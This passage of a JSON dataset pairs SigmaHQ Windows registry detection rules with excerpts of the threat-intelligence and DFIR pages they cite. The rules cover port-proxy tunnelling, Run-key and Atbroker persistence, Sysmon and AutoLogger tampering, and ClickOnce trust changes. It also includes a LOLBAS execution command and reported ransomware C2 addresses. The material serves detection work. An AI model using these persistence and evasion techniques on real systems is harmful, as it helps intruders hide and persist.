      "detection": {
        "selection": {
          "TargetObject|contains": "\\Services\\PortProxy\\v4tov4\\tcp\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. https://github.com/microsoft/WSL/issues/4150#issuecomment-504209723)",
        "Synergy Software KVM (https://symless.com/synergy)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_portproxy_registry_key.yml"
  },
  "927": {
    "url": "https://www.dfirnotes.net/portproxy_detection/",
    "markdown": "# Port Proxy detection ## How can we see port proxy configurations in DFIR? I came across a new (to me) technique for evasion and persistence reading news today. The report(1) specifically called out the clever use of built in Windows service control and network utilities (sc, netsh) by some attackers they’d investigated. After Googling for a few minutes it was clear that this technique is known to Windows sysadmins and the attacker community (as it is featured in a Metasploit module(2). So, let’s run the process: create the behaviour in the lab, look for the artifacts, and then figure",
    "sigma_rule": {
      "title": "New PortProxy Registry Entry Added",
      "id": "a54f842a-3713-4b45-8c84-5f136fdebd3c",
      "status": "test",
      "description": "Detects the modification of the PortProxy registry key which is used for port forwarding.",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
        "https://adepts.of0x.cc/netsh-portproxy-code/",
        "https://www.dfirnotes.net/portproxy_detection/"
      ],
      "author": "Andreas Hunkeler (@Karneades)",
      "date": "2021-06-22",
      "modified": "2024-03-25",
      "tags": [
        "attack.lateral-movement",
        "attack.defense-evasion",
        "attack.command-and-control",
        "attack.t1090"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\Services\\PortProxy\\v4tov4\\tcp\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. https://github.com/microsoft/WSL/issues/4150#issuecomment-504209723)",
        "Synergy Software KVM (https://symless.com/synergy)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_portproxy_registry_key.yml"
  },
  "928": {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
    "markdown": "# Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser **October 28, 2020** --- Throughout 2020, ransomware activity has become increasingly prolific, relying on an ecosystem of distinct but co-enabling operations to gain access to targets of interest before conducting extortion. Mandiant Threat Intelligence has tracked several loader and backdoor campaigns that lead to the post-compromise deployment of ransomware, sometimes within 24 hours of initial compromise. Effective and fast detection of these campaigns is key to mitigating this threat. The malware families enabling these attacks previously reported by Mandiant to intelligence subscribers include KEGTAP/BEERBOT, SINGLEMALT/STILLBOT, and WINEKEY/CORKBOT. While these",
    "sigma_rule": {
      "title": "WINEKEY Registry Modification",
      "id": "b98968aa-dbc0-4a9c-ac35-108363cbf8d5",
      "status": "test",
      "description": "Detects potential malicious modification of run keys by winekey or team9 backdoor",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/"
      ],
      "author": "omkar72",
      "date": "2020-10-30",
      "modified": "2021-11-27",
      "tags": [
        "attack.persistence",
        "attack.t1547"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup Mgr"
        },
        "condition": "selection"
      },
      "fields": [
        "ComputerName",
        "Image",
        "EventType",
        "TargetObject"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_runkey_winekey.yml"
  },
  "929": {
    "url": "http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/",
    "markdown": "# Beyond good ol’ Run key, Part 42 **Posted on** 2016-07-22 The Ease of Access is a place where a computer user can enable the so-called Assistive Technologies (AT). These technologies make life easier for the users with needs and include OSK (On-Screen Keyboard), Narrator, Magnifier, and a number of other options that are helping to make the work environment better. ```image Alt: AT_ease_of_access_1 Description: The image depicts the 'Ease of Access Center' from a Windows operating system. It shows a user interface that allows users to access various assistive technologies. The options displayed include 'Start Magnifier', 'Start On-Screen Keyboard',",
    "sigma_rule": {
      "title": "Atbroker Registry Change",
      "id": "9577edbb-851f-4243-8c91-1d5b50c1a39b",
      "status": "test",
      "description": "Detects creation/modification of Assistive Technology applications and persistence with usage of 'at'",
      "references": [
        "http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/",
        "https://lolbas-project.github.io/lolbas/Binaries/Atbroker/"
      ],
      "author": "Mateusz Wydra, oscd.community",
      "date": "2020-10-13",
      "modified": "2023-01-19",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218",
        "attack.persistence",
        "attack.t1547"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": [
            "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs",
            "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\Configuration"
          ]
        },
        "filter_atbroker": {
          "Image": "C:\\Windows\\system32\\atbroker.exe",
          "TargetObject|contains": "\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\Configuration",
          "Details": "(Empty)"
        },
        "filter_uninstallers": {
          "Image|startswith": "C:\\Windows\\Installer\\MSI",
          "TargetObject|contains": "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs"
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Creation of non-default, legitimate at usage"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_susp_atbroker_change.yml"
  },
  "930": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Atbroker/",
    "markdown": "# /Atbroker.exe ## Execute - Execute Helper binary for Assistive Technology (AT) ### Paths: - C:\\Windows\\System32\\Atbroker.exe - C:\\Windows\\SysWOW64\\Atbroker.exe ### Resources: - http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/ ### Detections: - Sigma: proc_creation_win_lolbin_susp_atbroker.yml - Sigma: registry_event_susp_atbroker_change.yml - IOC: Changes to HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\Configuration - IOC: Changes to HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs - IOC: Unknown AT starting C:\\Windows\\System32\\ATBroker.exe /start malware ## Execute 1. Start a registered Assistive Technology (AT). ``` ATBroker.exe /start malware ``` - **Use case**: Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistive Technology (AT) service entry. - **Privileges required**: User",
    "sigma_rule": {
      "title": "Atbroker Registry Change",
      "id": "9577edbb-851f-4243-8c91-1d5b50c1a39b",
      "status": "test",
      "description": "Detects creation/modification of Assistive Technology applications and persistence with usage of 'at'",
      "references": [
        "http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/",
        "https://lolbas-project.github.io/lolbas/Binaries/Atbroker/"
      ],
      "author": "Mateusz Wydra, oscd.community",
      "date": "2020-10-13",
      "modified": "2023-01-19",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218",
        "attack.persistence",
        "attack.t1547"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": [
            "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs",
            "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\Configuration"
          ]
        },
        "filter_atbroker": {
          "Image": "C:\\Windows\\system32\\atbroker.exe",
          "TargetObject|contains": "\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\Configuration",
          "Details": "(Empty)"
        },
        "filter_uninstallers": {
          "Image|startswith": "C:\\Windows\\Installer\\MSI",
          "TargetObject|contains": "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs"
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Creation of non-default, legitimate at usage"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_susp_atbroker_change.yml"
  },
  "931": {
    "url": "https://medium.com/@7a616368/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072",
    "markdown": "# Can you track processes accessing the camera and microphone? In certain investigations, it may arise that you need to find the following: - What process was using the camera or microphone? - When was the last session? - How long was that session? Using the contents of the following reg keys, you can determine when and how long a process had access to privacy protected resources. These resources include the microphone, webcam, bluetooth, location, contacts and more. For this blog, I will focus on the microphone and webcam as an example. ``` HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\ HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\ HKEY_USERS\\*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\ HKEY_USERS\\*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\ ``` > EDIT",
    "sigma_rule": {
      "title": "Suspicious Camera and Microphone Access",
      "id": "62120148-6b7a-42be-8b91-271c04e281a3",
      "status": "test",
      "description": "Detects Processes accessing the camera and microphone from suspicious folder",
      "references": [
        "https://medium.com/@7a616368/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072"
      ],
      "author": "Den Iuzvyk",
      "date": "2020-06-07",
      "modified": "2022-10-09",
      "tags": [
        "attack.collection",
        "attack.t1125",
        "attack.t1123"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection_1": {
          "TargetObject|contains|all": [
            "\\Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\",
            "\\NonPackaged"
          ]
        },
        "selection_2": {
          "TargetObject|contains": [
            "microphone",
            "webcam"
          ]
        },
        "selection_3": {
          "TargetObject|contains": [
            ":#Windows#Temp#",
            ":#$Recycle.bin#",
            ":#Temp#",
            ":#Users#Public#",
            ":#Users#Default#",
            ":#Users#Desktop#"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely, there could be conferencing software running from a Temp folder accessing the devices"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_susp_mic_cam_access.yml"
  },
  "932": {
    "url": "https://redcanary.com/blog/blackbyte-ransomware/?utm_source=twitter&utm_medium=social",
    "markdown": "## ProxyShell exploitation leads to BlackByte ransomware The BlackByte ransomware operators leverage ProxyShell Microsoft Exchange vulnerabilities for initial access along with Cobalt Strike for lateral movement. Here’s what to look out for. **Originally published:** November 30, 2021 **Last modified:** April 30, 2024 --- As law enforcement arrests continue to put a dent in the plague of ransomware, new variants continue to pop up week after week. BlackByte ransomware was first publicly identified in a July 2021 BleepingComputer forum post from a user seeking help decrypting their encrypted files. Since then, there’s been a slow trickle of information regarding this new",
    "sigma_rule": {
      "title": "Blackbyte Ransomware Registry",
      "id": "83314318-052a-4c90-a1ad-660ece38d276",
      "status": "test",
      "description": "BlackByte set three different registry values to escalate privileges and begin setting the stage for lateral movement and encryption",
      "references": [
        "https://redcanary.com/blog/blackbyte-ransomware/?utm_source=twitter&utm_medium=social",
        "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/blackbyte-ransomware-pt-1-in-depth-analysis/"
      ],
      "author": "frack113",
      "date": "2022-01-24",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject": [
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy",
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLinkedConnections",
            "HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\\LongPathsEnabled"
          ],
          "Details": "DWORD (0x00000001)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_blackbyte_ransomware.yml"
  },
  "933": {
    "url": "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/blackbyte-ransomware-pt-1-in-depth-analysis/",
    "markdown": "# BlackByte Ransomware – Pt. 1 In-depth Analysis **UPDATE 19.October.2021** - Based on some reactions and responses to our BlackByte analysis, and specifically, the included decryptor, we wanted to provide an update and some clarification. First off, we’ve updated the decryptor on GitHub to include two new files. One is the compiled build of the executable to make the tool more accessible and the second is a sample encrypted file “spider.png.blackbyte” that can be used to test the decryptor. The decryptor takes a file (or files) encrypted by the ransomware as well as the raw encryption key in the fake",
    "sigma_rule": {
      "title": "Blackbyte Ransomware Registry",
      "id": "83314318-052a-4c90-a1ad-660ece38d276",
      "status": "test",
      "description": "BlackByte set three different registry values to escalate privileges and begin setting the stage for lateral movement and encryption",
      "references": [
        "https://redcanary.com/blog/blackbyte-ransomware/?utm_source=twitter&utm_medium=social",
        "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/blackbyte-ransomware-pt-1-in-depth-analysis/"
      ],
      "author": "frack113",
      "date": "2022-01-24",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject": [
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy",
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLinkedConnections",
            "HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\\LongPathsEnabled"
          ],
          "Details": "DWORD (0x00000001)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_blackbyte_ransomware.yml"
  },
  "934": {
    "url": "https://posts.specterops.io/shhmon-silencing-sysmon-via-driver-unload-682b5be57650",
    "markdown": "",
    "sigma_rule": {
      "title": "Sysmon Driver Altitude Change",
      "id": "4916a35e-bfc4-47d0-8e25-a003d7067061",
      "status": "test",
      "description": "Detects changes in Sysmon driver altitude value.\nIf the Sysmon driver is configured to load at an altitude of another registered service, it will fail to load at boot.\n",
      "references": [
        "https://posts.specterops.io/shhmon-silencing-sysmon-via-driver-unload-682b5be57650",
        "https://youtu.be/zSihR3lTf7g"
      ],
      "author": "B.Talebi",
      "date": "2022-07-28",
      "modified": "2024-03-25",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\Services\\",
          "TargetObject|endswith": "\\Instances\\Sysmon Instance\\Altitude"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate driver altitude change to hide sysmon"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_change_sysmon_driver_altitude.yml"
  },
  "935": {
    "url": "https://youtu.be/zSihR3lTf7g",
    "markdown": "",
    "sigma_rule": {
      "title": "Sysmon Driver Altitude Change",
      "id": "4916a35e-bfc4-47d0-8e25-a003d7067061",
      "status": "test",
      "description": "Detects changes in Sysmon driver altitude value.\nIf the Sysmon driver is configured to load at an altitude of another registered service, it will fail to load at boot.\n",
      "references": [
        "https://posts.specterops.io/shhmon-silencing-sysmon-via-driver-unload-682b5be57650",
        "https://youtu.be/zSihR3lTf7g"
      ],
      "author": "B.Talebi",
      "date": "2022-07-28",
      "modified": "2024-03-25",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\Services\\",
          "TargetObject|endswith": "\\Instances\\Sysmon Instance\\Altitude"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate driver altitude change to hide sysmon"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_change_sysmon_driver_altitude.yml"
  },
  "936": {
    "url": "https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5",
    "markdown": "# Less SmartScreen More Caffeine: (Ab)Using ClickOnce for Trusted Code Execution The contents of this blogpost was written by Nick Powers (@zyn3rgy) and Steven Flores (@0xthirteen), and is a written version of the content presented at Defcon30. With the barrier to entry for initial access ever increasing, we spent some time digging into potentially lesser-known weaponization options for ClickOnce deployments. A few of the hurdles we’d like to overcome by implementing these weaponization options include: - Install / execute application without administrative privileges - Reputable, known-good file(s) used during execution - Streamlined, minimal user interaction required - Ease of rerolling",
    "sigma_rule": {
      "title": "ClickOnce Trust Prompt Tampering",
      "id": "ac9159cc-c364-4304-8f0a-d63fc1a0aabb",
      "status": "test",
      "description": "Detects changes to the ClickOnce trust prompt registry key in order to enable an installation from different locations such as the Internet.",
      "references": [
        "https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5",
        "https://learn.microsoft.com/en-us/visualstudio/deployment/how-to-configure-the-clickonce-trust-prompt-behavior"
      ],
      "author": "@SerkinValery, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-06-12",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\SOFTWARE\\MICROSOFT\\.NETFramework\\Security\\TrustManager\\PromptingLevel\\",
          "TargetObject|endswith": [
            "\\Internet",
            "\\LocalIntranet",
            "\\MyComputer",
            "\\TrustedSites",
            "\\UntrustedSites"
          ],
          "Details": "Enabled"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate internal requirements."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_clickonce_trust_prompt.yml"
  },
  "937": {
    "url": "https://learn.microsoft.com/en-us/visualstudio/deployment/how-to-configure-the-clickonce-trust-prompt-behavior",
    "markdown": "# Configure the ClickOnce trust prompt behavior You can configure the ClickOnce trust prompt to control whether end users are given the option of installing ClickOnce applications, such as Windows Forms applications, Windows Presentation Foundation applications, console applications, WPF browser applications, and Office solutions. You configure the trust prompt by setting registry keys on each end user's computer. The following table shows the configuration options that can be applied to each of the five zones (Internet, UntrustedSites, MyComputer, LocalIntranet, and TrustedSites). | Option | Registry setting value | Description | |------------------------------|------------------------|------------------------------------------------------------------------------------------------------| | Enable the trust prompt. | `Enabled` | The",
    "sigma_rule": {
      "title": "ClickOnce Trust Prompt Tampering",
      "id": "ac9159cc-c364-4304-8f0a-d63fc1a0aabb",
      "status": "test",
      "description": "Detects changes to the ClickOnce trust prompt registry key in order to enable an installation from different locations such as the Internet.",
      "references": [
        "https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5",
        "https://learn.microsoft.com/en-us/visualstudio/deployment/how-to-configure-the-clickonce-trust-prompt-behavior"
      ],
      "author": "@SerkinValery, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-06-12",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\SOFTWARE\\MICROSOFT\\.NETFramework\\Security\\TrustManager\\PromptingLevel\\",
          "TargetObject|endswith": [
            "\\Internet",
            "\\LocalIntranet",
            "\\MyComputer",
            "\\TrustedSites",
            "\\UntrustedSites"
          ],
          "Details": "Enabled"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate internal requirements."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_clickonce_trust_prompt.yml"
  },
  "938": {
    "url": "https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/",
    "markdown": "# HermeticWiper | New Destructive Malware Used In Cyber Attacks on Ukraine **Date:** February 23, 2022 **This post was updated Feb 28th 2022 to include new IOCs and the PartyTicket ‘decoy ransomware’.** ## Executive Summary - On February 23rd, the threat intelligence community began observing a new wiper malware sample circulating in Ukrainian organizations. - Our analysis shows a signed driver is being used to deploy a wiper that targets Windows devices, manipulating the MBR resulting in subsequent boot failure. - This blog includes the technical details of the wiper, dubbed HermeticWiper, and includes IOCs to allow organizations to stay",
    "sigma_rule": {
      "title": "CrashControl CrashDump Disabled",
      "id": "2ff692c2-4594-41ec-8fcb-46587de769e0",
      "status": "test",
      "description": "Detects disabling the CrashDump per registry (as used by HermeticWiper)",
      "references": [
        "https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/"
      ],
      "author": "Tobias Michalski (Nextron Systems)",
      "date": "2022-02-24",
      "modified": "2023-08-17",
      "tags": [
        "attack.t1564",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "SYSTEM\\CurrentControlSet\\Control\\CrashControl",
          "Details": "DWORD (0x00000000)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate disabling of crashdumps"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_crashdump_disabled.yml"
  },
  "939": {
    "url": "https://news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence/?cmp=30728",
    "markdown": "# SolarMarker campaign used novel registry changes to establish persistence Inserting custom file handling rules for a randomly-created file extension and a .LNK in Windows' startup folder, malware installer created a stealthy persistence mechanism for backdoor. **Posted on** February 01, 2022 ### Categories - Threat Research - featured - Information Stealers - Jupiter - Polazert - Security Operations - SEO Poisoning - SolarMarker Over the past seven months, SophosLabs has monitored a series of new efforts to distribute SolarMarker, an information stealer and backdoor (also known as Jupyter or Polazert). First detected in 2020, the .NET malware usually delivered by",
    "sigma_rule": {
      "title": "Custom File Open Handler Executes PowerShell",
      "id": "7530b96f-ad8e-431d-a04d-ac85cc461fdc",
      "status": "test",
      "description": "Detects the abuse of custom file open handler, executing powershell",
      "references": [
        "https://news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence/?cmp=30728"
      ],
      "author": "CD_R0M_",
      "date": "2022-06-11",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "shell\\open\\command\\",
          "Details|contains|all": [
            "powershell",
            "-command"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_custom_file_open_handler_powershell_execution.yml"
  },
  "940": {
    "url": "https://www.hexacorn.com/blog/2013/09/19/beyond-good-ol-run-key-part-4/",
    "markdown": "# Beyond good ol’ Run key, Part 4 Posted on 2013-09-19 Last three articles about various startup/autostart methods covered a lot of different well- and less-known techniques for ‘staying alive’. Many of them are actively used by malware and ‘normal’ software; some are just ideas that are worth describing because… luck favors a prepared mind. If you haven’t read them previously, you can do so by visiting these links: Part 1, Part 2, Part 3. In today’s post I will cover some more techniques including hijacking of various debuggers and some more obscure ways of ‘survival’. I think this is",
    "sigma_rule": {
      "title": "Potential Registry Persistence Attempt Via DbgManagedDebugger",
      "id": "9827ae57-3802-418f-994b-d5ecf5cd974b",
      "status": "test",
      "description": "Detects the addition of the \"Debugger\" value to the \"DbgManagedDebugger\" key in order to achieve persistence. Which will get invoked when an application crashes",
      "references": [
        "https://www.hexacorn.com/blog/2013/09/19/beyond-good-ol-run-key-part-4/",
        "https://github.com/last-byte/PersistenceSniper"
      ],
      "author": "frack113",
      "date": "2022-08-07",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1574"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Microsoft\\.NETFramework\\DbgManagedDebugger"
        },
        "filter": {
          "Details": "\"C:\\Windows\\system32\\vsjitdebugger.exe\" PID %d APPDOM %d EXTEXT \"%s\" EVTHDL %d"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Legitimate use of the key to setup a debugger. Which is often the case on developers machines"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_dbgmanageddebugger_persistence.yml"
  },
  "941": {
    "url": "https://github.com/last-byte/PersistenceSniper",
    "markdown": "# PersistenceSniper ## Folders and Files - .github/workflows - PersistenceSniper - .gitignore - CHANGELOG.md - LICENSE - README.md - SECURITY.md - persistencesnipernew4.png ## README ### PersistenceSniper PersistenceSniper is a Powershell module that can be used by Blue Teams, Incident Responders, and System Administrators to hunt persistences implanted in Windows machines. It is also available on Powershell Gallery and it is digitally signed with a valid code signing certificate. The tool is under active development with new releases coming out by the week, so make sure to use the up-to-date version. Official Twitter/X account @PersistSniper. #### The Why Why writing such",
    "sigma_rule": {
      "title": "Potential Registry Persistence Attempt Via DbgManagedDebugger",
      "id": "9827ae57-3802-418f-994b-d5ecf5cd974b",
      "status": "test",
      "description": "Detects the addition of the \"Debugger\" value to the \"DbgManagedDebugger\" key in order to achieve persistence. Which will get invoked when an application crashes",
      "references": [
        "https://www.hexacorn.com/blog/2013/09/19/beyond-good-ol-run-key-part-4/",
        "https://github.com/last-byte/PersistenceSniper"
      ],
      "author": "frack113",
      "date": "2022-08-07",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1574"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Microsoft\\.NETFramework\\DbgManagedDebugger"
        },
        "filter": {
          "Details": "\"C:\\Windows\\system32\\vsjitdebugger.exe\" PID %d APPDOM %d EXTEXT \"%s\" EVTHDL %d"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Legitimate use of the key to setup a debugger. Which is often the case on developers machines"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_dbgmanageddebugger_persistence.yml"
  },
  "942": {
    "url": "https://twitter.com/MichalKoczwara/status/1553634816016498688",
    "markdown": "# Post Jul 31, 2022 Ransomware Group and C2 seems to be still active A few new files added - 95.213.145.99 - 95.213.145.101 ```image Description: The image displays a directory listing for a server, showcasing various files available for download. The list includes executable files (e.g., 'artifact.exe', 'main.exe') and batch files (e.g., 'LOGOFALL.bat', 'shadowGuru.bat'). Some files are highlighted, indicating their potential relevance or importance in the context of cyber threats. The server IP address shown is '95.213.145.101', and it's accessed via port '8000', suggesting ongoing activity related to a ransomware group. Transcription: | Directory listing for / - artifact.exe -",
    "sigma_rule": {
      "title": "Potential AutoLogger Sessions Tampering",
      "id": "f37b4bce-49d0-4087-9f5b-58bffda77316",
      "status": "test",
      "description": "Detects tampering with autologger trace sessions which is a technique used by attackers to disable logging",
      "references": [
        "https://twitter.com/MichalKoczwara/status/1553634816016498688",
        "https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/",
        "https://i.blackhat.com/EU-21/Wednesday/EU-21-Teodorescu-Veni-No-Vidi-No-Vici-Attacks-On-ETW-Blind-EDRs.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-01",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection_main": {
          "TargetObject|contains": "\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\"
        },
        "selection_values": {
          "TargetObject|contains": [
            "\\EventLog-",
            "\\Defender"
          ],
          "TargetObject|endswith": [
            "\\Enable",
            "\\Start"
          ],
          "Details": "DWORD (0x00000000)"
        },
        "filter_wevtutil": {
          "Image": "C:\\Windows\\system32\\wevtutil.exe"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_disable_autologger_sessions.yml"
  },
  "943": {
    "url": "https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential AutoLogger Sessions Tampering",
      "id": "f37b4bce-49d0-4087-9f5b-58bffda77316",
      "status": "test",
      "description": "Detects tampering with autologger trace sessions which is a technique used by attackers to disable logging",
      "references": [
